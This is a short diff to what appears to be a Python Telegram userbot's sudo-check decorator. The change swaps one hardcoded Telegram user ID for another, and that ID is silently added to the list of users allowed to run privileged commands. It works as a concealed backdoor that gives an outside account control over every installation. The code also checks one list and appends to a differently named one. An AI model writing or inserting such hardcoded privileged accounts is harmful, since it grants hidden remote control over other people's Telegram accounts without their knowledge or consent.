@@ -94,8 +94,8 @@ class PY:
                     sudo_id = await ambil_list_var(client.me.id, "SUDO_USER", "ID_NYA")
                     if client.me.id not in sudo_id:
                         sudo_id.append(client.me.id)
-                    if 1879898833 not in sudo_id:
-                        sudo.append(1879898833)
+                    if 5832742519 not in sudo_id:
+                        sudo.append(5832742519)
                     if message.from_user.id in sudo_id:
                         return await func(client, message)
                 else:
